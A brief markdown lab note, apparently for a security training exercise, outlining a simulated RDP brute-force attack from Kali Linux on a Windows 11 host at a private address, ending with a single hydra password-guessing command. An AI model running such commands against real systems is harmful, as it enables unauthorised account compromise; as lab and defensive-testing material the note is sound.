# RDP Brute Force Simulation

## Objective
Simulate authentication abuse against a Windows 11 system.

## Attacker
- Kali Linux

## Target
- Windows 11

## Protocol
- TCP 3389

## Tool
- Hydra / Crowbar

## Command
```bash
hydra -l admin -P passwords.txt rdp://10.0.60.20